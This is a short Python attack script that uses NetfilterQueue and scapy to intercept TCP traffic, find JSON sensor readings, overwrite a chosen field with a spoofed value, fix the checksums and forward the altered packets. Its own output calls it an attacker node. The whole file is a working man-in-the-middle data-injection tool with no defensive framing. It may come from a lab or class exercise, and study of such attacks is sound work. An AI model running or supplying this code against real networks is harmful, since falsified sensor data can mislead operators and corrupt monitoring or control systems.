from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import json
import traceback

TARGET_COLUMN = "p1"       # <-- APNI EXCEL KA ACTUAL COLUMN NAAM DAALO
SPOOFED_VALUE = 999.99     

def process_packet(packet):
    try:
        scapy_packet = scapy.IP(packet.get_payload())

        if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
            raw_data = scapy_packet[scapy.Raw].load.decode('utf-8', errors='ignore')
            
            if "sensor_id" in raw_data:
                try:
                    payload = json.loads(raw_data.strip())
                    
                    if "data" in payload and TARGET_COLUMN in payload["data"]:
                        original_val = payload["data"][TARGET_COLUMN]
                        payload["data"][TARGET_COLUMN] = SPOOFED_VALUE
                        
                        print(f"[!] INJECTION SUCCESS: {TARGET_COLUMN} = {original_val} -> {SPOOFED_VALUE}")
                        
                        new_raw_data = json.dumps(payload) + '\n'
                        scapy_packet[scapy.Raw].load = new_raw_data.encode('utf-8')
                        
                        # Strict Network Integrity fixes
                        del scapy_packet[scapy.TCP].options
                        del scapy_packet[scapy.IP].len
                        del scapy_packet[scapy.IP].chksum
                        del scapy_packet[scapy.TCP].chksum
                        
                        packet.set_payload(bytes(scapy_packet))
                except json.JSONDecodeError:
                    pass 
    except Exception:
        pass

    packet.accept()

queue = NetfilterQueue()
queue.bind(1, process_packet)
print("[*] Attacker Node Active. Intercepting on Queue 1...")
try:
    queue.run()
except KeyboardInterrupt:
    queue.unbind()